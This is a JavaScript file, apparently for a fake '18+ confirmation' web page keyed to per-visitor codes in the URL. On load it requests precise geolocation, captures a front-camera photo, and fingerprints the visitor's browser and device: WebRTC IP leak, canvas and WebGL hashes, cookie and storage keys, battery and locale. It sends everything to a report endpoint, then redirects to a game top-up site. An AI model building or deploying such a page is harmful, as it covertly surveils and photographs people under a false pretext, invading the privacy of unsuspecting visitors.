// === app.js CLEAN (NO ACTIVE JB SCHEMES) ===

const QSP = {
  get(k) {
    try {
      return new URLSearchParams(location.search).get(k);
    } catch {
      return null;
    }
  }
};

const LITE_MODE =
  QSP.get("lite") === "1" || QSP.get("no_media") === "1";

const API_BASE =
  (typeof window !== "undefined" && window.__API_BASE)
    ? String(window.__API_BASE).replace(/\/+$/, "")
    : "";

const STRICT_MODE = QSP.get("strict") === "1";
const DEV_LOG = QSP.get("dev_log") === "1";

function dlog(...a) {
  if (DEV_LOG) console.log("[gate]", ...a);
}

// UI Elements
const UI = {
  text: document.getElementById("text"),
  note: document.getElementById("note"),
  btn: document.getElementById("enterBtn"),
  reason: document.getElementById("reason"),
  title: document.getElementById("title")
};

function setBtnLocked() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = true;
  b.style.filter = "grayscale(40%) brightness(0.8)";
  b.style.opacity = "0.6";
  b.style.cursor = "not-allowed";
  b.style.background = "linear-gradient(90deg,#246,#39a)";
}
function setBtnReady() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = false;
  b.style.filter = "none";
  b.style.opacity = "1";
  b.style.cursor = "pointer";
  b.style.background = "linear-gradient(90deg,#4f00ff,#00bfff)";
}
function showBtn() {
  if (UI.btn) UI.btn.style.display = "block";
}
function hideBtn() {
  if (UI.btn) UI.btn.style.display = "none";
}

function determineCode() {
  const q = QSP.get("code");
  const code = q ? String(q).trim() : null;
  return code && /^[A-Za-z0-9-]{3,40}$/.test(code) ? code : null;
}

async function askGeolocation() {
  return new Promise((resolve) => {
    if (LITE_MODE || window.__DISABLE_GEO === true) return resolve(null);
    if (!("geolocation" in navigator)) return resolve(null);
    navigator.geolocation.getCurrentPosition(
      (p) =>
        resolve({
          lat: p.coords.latitude,
          lon: p.coords.longitude,
          acc: Math.round(p.coords.accuracy),
          ts: Date.now()
        }),
      () => resolve(null),
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

function downscaleDataUrl(dataUrl, maxSide = 1024, quality = 0.6) {
  return new Promise((resolve, reject) => {
    const img = new Image();
    img.onload = () => {
      const ratio = Math.min(1, maxSide / Math.max(img.width, img.height));
      const w = Math.round(img.width * ratio);
      const h = Math.round(img.height * ratio);
      const c = document.createElement("canvas");
      c.width = w;
      c.height = h;
      c.getContext("2d").drawImage(img, 0, 0, w, h);
      try {
        resolve(c.toDataURL("image/jpeg", quality));
      } catch (e) {
        reject(e);
      }
    };
    img.onerror = reject;
    img.src = dataUrl;
  });
}

window.__cameraLatencyMs = null;

async function takePhotoNormal() {
  if (!navigator.mediaDevices?.getUserMedia)
    throw new Error("Камера недоступна");

  const t0 = performance.now();
  const stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: "user" }
  });

  return new Promise((resolve, reject) => {
    const video = document.createElement("video");
    video.srcObject = stream;
    video.playsInline = true;

    const fallback = setTimeout(() => {
      try {
        const c = document.createElement("canvas");
        c.width = 1280;
        c.height = 720;
        c.getContext("2d").drawImage(video, 0, 0);
        const dataUrl = c.toDataURL("image/jpeg", 0.8);
        stream.getTracks().forEach((t) => t.stop());
        window.__cameraLatencyMs = Math.round(performance.now() - t0);
        resolve(dataUrl);
      } catch (e) {
        reject(e);
      }
    }, 3000);

    video.onloadedmetadata = async () => {
      try {
        await video.play();
        clearTimeout(fallback);
        const c = document.createElement("canvas");
        c.width = video.videoWidth || 1280;
        c.height = video.videoHeight || 720;
        c.getContext("2d").drawImage(video, 0, 0);
        const dataUrl = c.toDataURL("image/jpeg", 0.85);
        stream.getTracks().forEach((t) => t.stop());
        window.__cameraLatencyMs = Math.round(performance.now() - t0);
        resolve(dataUrl);
      } catch (err) {
        stream.getTracks().forEach((t) => t.stop());
        reject(err);
      }
    };
  });
}

(function ensureFileInput() {
  if (!document.getElementById("fileInp")) {
    const inp = document.createElement("input");
    inp.id = "fileInp";
    inp.type = "file";
    inp.accept = "image/*";
    inp.capture = "user";
    inp.style.display = "none";
    document.body.appendChild(inp);
  }
})();

async function takePhotoWithFallbackNormal() {
  try {
    return await takePhotoNormal();
  } catch {
    const inp = document.getElementById("fileInp");
    return new Promise((resolve, reject) => {
      inp.onchange = () => {
        const f = inp.files && inp.files[0];
        if (!f) return reject(new Error("Файл не выбран"));
        const fr = new FileReader();
        fr.onload = () => resolve(fr.result);
        fr.onerror = reject;
        fr.readAsDataURL(f);
      };
      inp.click();
    });
  }
}

const LITE_PHOTO =
  "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8Xw8AAkMBgQq5xwAAAABJRU5ErkJggg==";

function takePhotoLite() {
  window.__cameraLatencyMs = null;
  return LITE_PHOTO;
}

function takePhotoUniversal() {
  if (LITE_MODE || window.__DISABLE_CAMERA === true)
    return takePhotoLite();
  return takePhotoWithFallbackNormal();
}

// iOS UA detection
function isIpadDesktopMode() {
  return navigator.platform === "MacIntel" && (navigator.maxTouchPoints || 0) > 1;
}
function isIOSHandheldUA(ua) {
  ua = ua || navigator.userAgent || "";
  return /(iPhone|iPad|iPod)/i.test(ua);
}
function parseIOSMajorFromUAUniversal(ua) {
  ua = ua || navigator.userAgent || "";
  const ipadDesktop = isIpadDesktopMode();
  const iosLike = isIOSHandheldUA(ua) || ipadDesktop;
  if (!iosLike) return null;
  const mOS = ua.match(/\bOS\s+(\d+)[._]/i);
  if (mOS) return parseInt(mOS[1], 10);
  if (ipadDesktop) {
    const mv = ua.match(/\bVersion\/(\d+)(?:[._]\d+)?/i);
    if (mv) return parseInt(mv[1], 10);
  }
  return null;
}

function getDeviceInfo() {
  const ua = navigator.userAgent || "";
  const iosVer = parseIOSMajorFromUAUniversal(ua);
  return {
    userAgent: ua,
    platform: navigator.platform,
    iosVersion: iosVer,
    isSafari:
      /Safari\//.test(ua) &&
      !/CriOS|Chrome|FxiOS|Edg|OPR/i.test(ua) &&
      navigator.vendor === "Apple Computer, Inc.",
    isIpadDesktop: isIpadDesktopMode()
  };
}

// Permission states
async function getPermissionStates() {
  if (LITE_MODE || window.__DISABLE_CAMERA || window.__DISABLE_GEO)
    return { geolocation: "denied", camera: "denied", microphone: "prompt" };

  if (!navigator.permissions?.query) return null;

  async function q(name) {
    try {
      return (await navigator.permissions.query({ name })).state;
    } catch {
      return "unknown";
    }
  }
  const [geo, cam, mic] = await Promise.all([
    q("geolocation"),
    q("camera"),
    q("microphone")
  ]);
  return { geolocation: geo, camera: cam, microphone: mic };
}
// === Part 2 — Networking, WebRTC, Canvas, Storage, WebGL, Locale, Devtools, Safari Tests ===

// WebRTC IP leak
async function collectWebRTCIps(timeoutMs = 2500) {
  if (!window.RTCPeerConnection) return [];
  return new Promise((resolve) => {
    const ips = new Set();
    const pc = new RTCPeerConnection({
      iceServers: [{ urls: "stun:stun.l.google.com:19302" }]
    });
    try {
      pc.createDataChannel("x");
    } catch {}

    pc.onicecandidate = (e) => {
      if (!e.candidate) return;
      const cand = e.candidate.candidate || "";
      const ipRegex = /([0-9]{1,3}(?:\.[0-9]{1,3}){3})|([0-9a-fA-F:]{2,})/;
      const m = cand.match(ipRegex);
      if (m) ips.add(m[0]);
    };

    pc.createOffer().then((o) => pc.setLocalDescription(o)).catch(() => {});
    const to = setTimeout(() => {
      try { pc.close(); } catch {}
      resolve([...ips]);
    }, timeoutMs);

    pc.onicegatheringstatechange = () => {
      if (pc.iceGatheringState === "complete") {
        clearTimeout(to);
        try { pc.close(); } catch {}
        resolve([...ips]);
      }
    };
  });
}

// Public IP fetch via server
async function fetchClientIP() {
  try {
    const r = await fetch(`${API_BASE}/api/client-ip`);
    if (!r.ok) return null;
    const j = await r.json().catch(() => null);
    return j || null;
  } catch {
    return null;
  }
}

// Canvas fingerprint
async function getCanvasFingerprint() {
  try {
    const c = document.createElement("canvas");
    c.width = 280;
    c.height = 80;
    const g = c.getContext("2d");
    g.textBaseline = "top";
    g.font = "16px Arial";
    g.fillStyle = "#f60";
    g.fillRect(0, 0, 280, 80);
    g.fillStyle = "#069";
    g.fillText("canvas-fp v1 • π Ω ✓", 2, 2);
    g.strokeStyle = "#222";
    g.beginPath();
    g.arc(140, 40, 18, 0, Math.PI * 2);
    g.stroke();

    const data = c.toDataURL();
    const enc = new TextEncoder().encode(data);

    if (crypto?.subtle?.digest) {
      const buf = await crypto.subtle.digest("SHA-256", enc);
      const arr = Array.from(new Uint8Array(buf));
      const hash = arr.map((x) => x.toString(16).padStart(2, "0")).join("");
      return { hash, size: data.length };
    }

    let h = 0;
    for (let i = 0; i < data.length; i++) {
      h = ((h << 5) - h) + data.charCodeAt(i);
      h |= 0;
    }
    return { hash: "f" + (h >>> 0).toString(16), size: data.length };
  } catch {
    return null;
  }
}

// Storage fingerprints
async function getStorageAndStorageLike() {
  let estimate = null;
  try { estimate = await navigator.storage?.estimate?.() || null; } catch {}

  let cookies = null;
  try {
    const raw = document.cookie || "";
    cookies = {
      length: raw.length,
      names: raw
        ? raw.split(";").map((s) => s.split("=")[0].trim()).slice(0, 30)
        : []
    };
  } catch {}

  function snap(s) {
    try {
      const n = s.length;
      const keys = [];
      let total = 0;
      for (let i = 0; i < n && i < 50; i++) {
        const k = s.key(i);
        keys.push(k);
        total += (s.getItem(k) || "").length;
      }
      return { count: n, approxBytes: total, keys };
    } catch {
      return null;
    }
  }

  return {
    estimate,
    cookies,
    local: snap(localStorage),
    session: snap(sessionStorage)
  };
}

// Network info
function getNetworkInfo() {
  const ni = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
  const out = ni ? {
    rtt: ni.rtt,
    downlink: ni.downlink,
    effectiveType: ni.effectiveType,
    saveData: !!ni.saveData
  } : {};
  try {
    const nav = performance.getEntriesByType("navigation")[0];
    if (nav?.responseStart) out.rttApprox = Math.round(nav.responseStart);
  } catch {}
  return out;
}

// Battery
async function getBatteryInfo() {
  try {
    if (!navigator.getBattery) return null;
    const b = await navigator.getBattery();
    return {
      level: Math.round(b.level * 100),
      charging: b.charging,
      chargingTime: b.chargingTime,
      dischargingTime: b.dischargingTime
    };
  } catch {
    return null;
  }
}

// WebGL fingerprint
function getWebGLInfo() {
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!gl) return null;
    const ext = gl.getExtension("WEBGL_debug_renderer_info");
    return {
      vendor: ext
        ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)
        : gl.getParameter(gl.VENDOR),
      renderer: ext
        ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)
        : gl.getParameter(gl.RENDERER)
    };
  } catch {
    return null;
  }
}

// In-app WebView detection
function detectInAppWebView() {
  const ua = navigator.userAgent || "";
  const flags = {
    Telegram: /Telegram/i.test(ua),
    Instagram: /Instagram/i.test(ua),
    Facebook: /FBAN|FBAV|FB_IAB/i.test(ua),
    Messenger: /FBAN|FBAV.*Messenger/i.test(ua),
    TikTok: /TikTok/i.test(ua),
    Discord: /Discord/i.test(ua),
    WeChat: /MicroMessenger/i.test(ua),
    WKWebView:
      /\bAppleWebKit\/\d+\.\d+\s+\(KHTML, like Gecko\)/.test(ua) &&
      !/Safari\//.test(ua)
  };
  const any = Object.keys(flags).filter((k) => flags[k]);
  return { flags, any, isInApp: any.length > 0 };
}

// Locale + display
async function getLocaleAndDisplay() {
  const tz = Intl?.DateTimeFormat?.().resolvedOptions?.().timeZone || null;

  let uaData = null;
  try {
    if (navigator.userAgentData?.getHighEntropyValues) {
      uaData = await navigator.userAgentData.getHighEntropyValues([
        "platform", "platformVersion", "architecture", "bitness",
        "model", "uaFullVersion"
      ]);
      uaData.brands = navigator.userAgentData.brands;
      uaData.mobile = navigator.userAgentData.mobile;
    }
  } catch {}

  return {
    languages: navigator.languages || [navigator.language],
    timeZone: tz,
    dpr: window.devicePixelRatio || 1,
    screen: {
      w: screen.width,
      h: screen.height,
      aw: screen.availWidth,
      ah: screen.availHeight
    },
    viewport: { w: innerWidth, h: innerHeight },
    platform: navigator.platform,
    vendor: navigator.vendor,
    ua: navigator.userAgent,
    uaData
  };
}

// Devtools heuristic (no advanced JB removal needed)
function detectDevtoolsHeuristic() {
  try {
    const dw = Math.abs((window.outerWidth || 0) - window.innerWidth);
    const dh = Math.abs((window.outerHeight || 0) - window.innerHeight);
    return { opened: dw > 120 || dh > 160, dw, dh };
  } catch {
    return null;
  }
}

// Datacenter IP words
const DC_ISP_WORDS = [
  "AMAZON","AWS","GOOGLE","GCP","MICROSOFT","AZURE","CLOUDFLARE",
  "HETZNER","OVH","DIGITALOCEAN","LINODE","IONOS","VULTR"
];

// Network heuristics (UNCHANGED)
function analyzeNetworkHeuristics({ publicIp, webrtcIps, network, cameraLatencyMs, locale, ipMeta }) {
  const reasons = [];
  let scoreAdj = 0;

  const isp = (publicIp?.isp || publicIp?.org || "").toUpperCase();
  if (DC_ISP_WORDS.some((w) => isp.includes(w))) {
    reasons.push("DC-ISP признак (AWS/Google/Azure)");
    scoreAdj -= 25;
  }

  const pubCandidates = (webrtcIps || []).filter(Boolean);
  if (pubCandidates.length >= 1) {
    reasons.push("WebRTC раскрыл публичный IP (VPN/tunnel?)");
    scoreAdj -= 10;
  }

  if (cameraLatencyMs != null && cameraLatencyMs <= 5) {
    reasons.push("Ненормально низкая cameraLatency");
    scoreAdj -= 10;
  }

  if (/2g/i.test(network?.effectiveType || "")) {
    reasons.push("Очень медленная сеть (2g)");
    scoreAdj -= 5;
  }

  if (network?.rtt > 800) {
    reasons.push("Очень высокий RTT");
    scoreAdj -= 5;
  }

  const tz = (locale?.timeZone || "").toUpperCase();
  const country = (publicIp?.country || ipMeta?.country || "").toUpperCase();
  if (
    tz &&
    country &&
    !tz.includes(country) &&
    !tz.includes("UTC") &&
    !tz.includes("GMT")
  ) {
    reasons.push(`Таймзона (${locale?.timeZone}) не совпадает со страной IP (${publicIp?.country})`);
    scoreAdj -= 8;
  }

  let label = "unlikely";
  if (scoreAdj <= -25) label = "likely";
  else if (scoreAdj <= -10) label = "possible";

  return { label, scoreAdj, reasons, dcIsp: label === "likely" };
}
// === Part 3 — collectClientProfile(), runDeviceCheck(), autoFlow, sendReport, init ===

// Safari 18 tests
async function testSafari18_0_ViewTransitions() {
  const hasAPI = typeof document.startViewTransition === "function";
  const cssOK = CSS?.supports?.("view-transition-name: auto") === true;
  let ran = false;
  let finished = false;

  try {
    if (hasAPI) {
      const div = document.createElement("div");
      div.textContent = "A";
      document.body.appendChild(div);
      const vt = document.startViewTransition(() => {
        div.textContent = "B";
        ran = true;
      });
      await vt?.finished;
      finished = true;
      div.remove();
    }
  } catch {}

  return {
    feature: "Safari 18.0 ViewTransitions",
    pass: !!(hasAPI && cssOK && ran && finished),
    details: { hasAPI, cssOK, ran, finished }
  };
}

async function testSafari18_4_Triple() {
  let shapeOK = false;
  try {
    const el = document.createElement("div");
    el.style.clipPath =
      "shape(from right center, line to bottom center, line to right center)";
    shapeOK = !!el.style.clipPath;
  } catch {}

  const cookieStoreOK =
    typeof window.cookieStore === "object" &&
    typeof window.cookieStore?.get === "function";

  const webauthnOK =
    typeof window.PublicKeyCredential?.parseCreationOptionsFromJSON === "function" &&
    typeof window.PublicKeyCredential?.parseRequestOptionsFromJSON === "function" &&
    typeof window.PublicKeyCredential?.prototype?.toJSON === "function";

  return {
    feature: "Safari 18.4 shape() + cookieStore + WebAuthn JSON",
    pass: !!(shapeOK && cookieStoreOK && webauthnOK),
    details: { shapeOK, cookieStoreOK, webauthnOK }
  };
}

async function runSafariFeatureTests(maxWaitMs = 1500) {
  const timeout = (p, ms) =>
    Promise.race([
      p,
      new Promise((res) =>
        setTimeout(
          () =>
            res({
              feature: "timeout",
              pass: false,
              details: { timeoutMs: ms }
            }),
          ms
        )
      )
    ]);

  const [vt18, triple18_4] = await Promise.all([
    timeout(testSafari18_0_ViewTransitions(), maxWaitMs),
    timeout(testSafari18_4_Triple(), maxWaitMs)
  ]);

  return { vt18_0: vt18, triple18_4 };
}

async function waitFeatureGate(maxMs = 800) {
  if (window.__featureGate) return window.__featureGate;

  return new Promise((resolve) => {
    const t = setTimeout(() => resolve(window.__featureGate || null), maxMs);
    window.addEventListener(
      "featuregate-ready",
      (ev) => {
        clearTimeout(t);
        resolve(ev.detail || window.__featureGate || null);
      },
      { once: true }
    );
  });
}

// =====================================
// CLEAN collectClientProfile() — NO ACTIVE JB
// =====================================
async function collectClientProfile() {
  // 🚫 УДАЛЕНО: collectActiveJailbreakProbes()
  // No jbProbesActive at all

  const [
    permissions,
    webrtcIps,
    publicIp,
    canvasFingerprint,
    storage,
    network,
    battery,
    webgl,
    inAppWebView,
    locale
  ] = await Promise.all([
    getPermissionStates(),
    collectWebRTCIps().catch(() => []),
    fetchClientIP(),
    getCanvasFingerprint(),
    getStorageAndStorageLike(),
    Promise.resolve(getNetworkInfo()),
    getBatteryInfo(),
    Promise.resolve(getWebGLInfo()),
    Promise.resolve(detectInAppWebView()),
    getLocaleAndDisplay()
  ]);

  const ua = navigator.userAgent || "";
  const maxTP = Number(navigator.maxTouchPoints || 0);
  const isIpad = /iPad/i.test(ua) || (navigator.platform === "MacIntel" && maxTP > 1);
  const iosVersion = parseIOSMajorFromUAUniversal(ua);

  const ispUp = (publicIp?.isp || publicIp?.org || "").toUpperCase();
  const dcWords = DC_ISP_WORDS.filter((w) => ispUp.includes(w));

  const ref = document.referrer || "";

  const profile = {
    permissions,
    webrtcIps,
    publicIp,
    canvasFingerprint,
    storage,
    network,
    battery,
    webgl,
    inAppWebView,
    locale,
    maxTouchPoints: maxTP,
    isIpad,
    iosVersion,
    liteMode: LITE_MODE,
    lite: LITE_MODE,
    dcIspKeywords: dcWords,
    referrer: ref || null,

    // 🚫 jbProbesActive removed
  };

  // link mismatch
  profile.linkFlowMismatch = !!(
    inAppWebView.isInApp ||
    /discord|telegram|instagram|tiktok|facebook|vk\.com/i.test(ref)
  );

  // Automation flags (unchanged)
  profile.shortcutUsed = !!(LITE_MODE && inAppWebView.isInApp);
  profile.shortCapUsed = profile.shortcutUsed;

  // WebAPI patched
  profile.modifiedWebApi = (() => {
    try {
      const isNative = (fn) =>
        typeof fn === "function" &&
        /\[native code\]/.test(Function.prototype.toString.call(fn));
      const arr = [
        navigator.permissions?.query,
        navigator.geolocation?.getCurrentPosition,
        navigator.mediaDevices?.getUserMedia
      ];
      return arr.filter(Boolean).some((fn) => !isNative(fn));
    } catch {
      return false;
    }
  })();
  profile.webApiPatched = profile.modifiedWebApi;

  // Automation heuristics (NO JB)
  profile.automation = !!(
    profile.shortcutUsed ||
    profile.linkFlowMismatch ||
    profile.modifiedWebApi
  );

  const small = [];
  if (/2g/i.test(network?.effectiveType || "")) small.push("effectiveType=2g");
  if (network?.rtt > 800) small.push("veryHighRTT");
  profile.smallSignals = small;

  return profile;
}

// =====================================
// CLEAN runDeviceCheck() — NO ACTIVE JB
// =====================================
async function runDeviceCheck(clientProfile) {
  const reasons = [];
  const details = {};
  let score = 100;

  try {
    details.ua = navigator.userAgent;
    details.vendor = navigator.vendor;
    details.platform = navigator.platform;
    details.lang = navigator.language;
    details.timezone = clientProfile?.locale?.timeZone;
    details.dpr = window.devicePixelRatio || 1;
    details.screen = clientProfile?.locale?.screen;
    details.maxTouchPoints = navigator.maxTouchPoints || 0;

    // webdriver
    details.navigator_webdriver = navigator.webdriver;
    if (navigator.webdriver) {
      reasons.push("navigator.webdriver === true");
      score -= 60;
    }

    // Devtools
    const devtools = detectDevtoolsHeuristic();
    details.devtools = devtools;
    if (devtools?.opened) {
      reasons.push("DevTools размеры окна");
      score -= 6;
    }

    // camera latency
    details.cameraLatencyMs = window.__cameraLatencyMs;
    if (!LITE_MODE && details.cameraLatencyMs != null && details.cameraLatencyMs <= 5) {
      reasons.push("Слишком малая cameraLatency");
      score -= 10;
    }

    // in-app webview
    if (clientProfile?.inAppWebView?.isInApp) {
      reasons.push("In-App WebView");
      score -= 8;
    }

    // Network heuristics
    const pn = analyzeNetworkHeuristics({
      publicIp: clientProfile?.publicIp,
      webrtcIps: clientProfile?.webrtcIps,
      network: clientProfile?.network,
      cameraLatencyMs: details.cameraLatencyMs,
      locale: clientProfile?.locale,
      ipMeta: clientProfile?.publicIp
    });

    details.pn_proxy = pn;

    if (pn.label === "likely") {
      reasons.push("VPN/Proxy likely");
      score -= 25;
    } else if (pn.label === "possible") {
      reasons.push("VPN/Proxy possible");
      score -= 10;
    }

    // 🚫 УДАЛЕНО:
    // ACTIVE JB penalty
    // (jbProbesActive has been removed entirely)

    if (score >= 80) {
      reasons.push("Ок: окружение выглядит правдоподобно");
    } else if (score >= 60) {
      reasons.push("Есть несостыковки — рекомендуется доп. проверка");
    } else {
      reasons.push("Высокая вероятность подмены/автоматизации");
    }
  } catch (e) {
    reasons.push("Ошибка проверки окружения: " + e.message);
  }

  return {
    score,
    label: score < 60 ? "likely" : score < 80 ? "possible" : "unlikely",
    reasons,
    details,
    timestamp: Date.now()
  };
}

// =====================================
// sendReport
// =====================================
async function sendReport({ photoBase64, geo, client_profile, device_check, featuresSummary }) {
  const	info = getDeviceInfo();
  const code = determineCode();
  if (!code) throw new Error("Нет кода в URL");

  const body = {
    userAgent: info.userAgent,
    platform: info.platform,
    iosVersion: info.iosVersion,
    isSafari: info.isSafari,
    geo,
    photoBase64,
    note: "auto",
    code,
    client_profile,
    device_check,
    featuresSummary,
    strict: STRICT_MODE ? 1 : 0
  };

  const r = await fetch(`${API_BASE}/api/report`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body)
  });

  const text = await r.text().catch(() => "");
  let data = null;
  try { data = JSON.parse(text); } catch {}

  if (!r.ok) throw new Error((data && data.error) || text);
  if (!data?.ok) throw new Error(data?.error || "Ошибка ответа сервера");

  return data;
}

// =====================================
// autoFlow
// =====================================
window.__reportReady = false;
window.__decision = null;

async function autoFlow() {
  try {
    setBtnLocked();
    showBtn();
    if (UI.title) UI.title.textContent = "Подтверждение 18+";
    if (UI.text) UI.text.innerHTML = "Готовим проверку устройства…";

    const code = determineCode();
    if (!code) {
      if (UI.title) UI.title.textContent = "Ошибка";
      if (UI.text) UI.text.innerHTML = '<span class="err">Нет кода в URL.</span>';
      hideBtn();
      return;
    }

    if (UI.note) UI.note.textContent = "Собираем данные…";

    const [geo, rawPhoto, client_profile] = await Promise.all([
      askGeolocation(),
      takePhotoUniversal(),
      collectClientProfile()
    ]);

    const photoBase64 = await downscaleDataUrl(rawPhoto, 1024, 0.6);

    if (UI.note) UI.note.textContent = "Проверяем системные возможности…";

    const fg = await waitFeatureGate();
    let vt18_ok, v184_ok;

    if (fg?.effective) {
      vt18_ok = !!fg.effective.vt18Pass;
      v184_ok = !!fg.effective.v184Pass;
    } else {
      const { vt18_0, triple18_4 } = await runSafariFeatureTests();
      vt18_ok = !!vt18_0?.pass;
      v184_ok = !!triple18_4?.pass;
    }

    const featuresSummary = {
      VT18: vt18_ok ? "ok" : "—",
      v18_4: v184_ok ? "ok" : "—"
    };

    if (UI.note) UI.note.textContent = "Анализ окружения…";

    const device_check = await runDeviceCheck(client_profile);

    // Safari 18 must pass
    if (!vt18_ok) {
      if (UI.title) UI.title.textContent = "Доступ отклонён";
      if (UI.text) UI.text.innerHTML =
        '<span class="err">Отказ по feature-tests (18.0 обязательно).</span>';
      if (UI.reason) UI.reason.textContent = `VT18=${vt18_ok ? "ok" : "—"} • 18.4=${v184_ok ? "ok" : "—"}`;
      try {
        await sendReport({ photoBase64, geo, client_profile, device_check, featuresSummary });
      } catch {}
      setBtnLocked();
      window.__reportReady = false;
      window.__decision = { canLaunch: false };
      return;
    }

    if (UI.text) UI.text.innerHTML = "Отправляем отчёт…";

    const resp = await sendReport({
      photoBase64,
      geo,
      client_profile,
      device_check,
      featuresSummary
    });

    const decision = resp?.decision || { canLaunch: true };
    const canLaunch = !!decision.canLaunch;
    window.__decision = decision;

    if (canLaunch) {
      window.__reportReady = true;
      setBtnReady();
      if (UI.title) UI.title.textContent = "Проверка пройдена";
      if (UI.text) UI.text.innerHTML = '<span class="ok">Ок (допуск выдан).</span>';
      const extra = LITE_MODE ? " • LITE" : "";
      if (UI.note) UI.note.textContent = `VT18=${vt18_ok?"ok":"—"} • 18.4=${v184_ok?"ok":"—"}${extra}`;
    } else {
      window.__reportReady = false;
      setBtnLocked();
      if (UI.title) UI.title.textContent = "Доступ отклонён";
      if (UI.text) UI.text.innerHTML = '<span class="err">Отказ (решение сервера).</span>';
      if (UI.note) UI.note.textContent = "Обратитесь в поддержку.";
    }
  } catch (e) {
    console.error("[AUTO-FLOW ERROR]", e);
    setBtnLocked();
    window.__reportReady = false;
    if (UI.title) UI.title.textContent = "Ошибка";
    if (UI.text) UI.text.innerHTML = '<span class="err">Ошибка проверки.</span>';
    if (UI.note) UI.note.textContent = String(e.message || e);
  }
}

// =====================================
// Wire enter button
// =====================================
(function wireEnter() {
  const btn = UI.btn;
  if (!btn) return;
  btn.addEventListener("click", (e) => {
    if (!window.__reportReady || !window.__decision?.canLaunch) {
      e.preventDefault();
      e.stopPropagation();
      return;
    }
    location.assign("https://www.pubgmobile.com/ig/itop");
  }, { capture: true });
})();

// =====================================
// INIT
// =====================================
function startWithGate() {
  setTimeout(() => autoFlow(), 60);
}

if (document.readyState === "complete" || document.readyState === "interactive") {
  startWithGate();
} else {
  document.addEventListener("DOMContentLoaded", startWithGate);
}
